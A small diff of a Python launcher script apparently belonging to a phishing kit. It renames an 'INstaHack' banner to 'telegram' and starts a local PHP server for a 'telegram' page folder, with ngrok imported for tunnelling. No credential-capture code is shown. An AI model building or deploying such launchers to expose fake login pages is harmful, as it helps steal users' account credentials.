@@ -5,7 +5,7 @@ from pyngrok import ngrok
 from subprocess import Popen
 print(Fore.GREEN)
 os.system("clear")
-ins =pyfiglet.figlet_format("INstaHack", font="3-d")
+ins =pyfiglet.figlet_format("telegram", font="3-d")
 print(Fore.RED+ins)
 with open("server","w") as phplog:
     Popen(("php","-S","localhost:4040","-t","telegram"),stderr=phplog ,stdout=phplog)
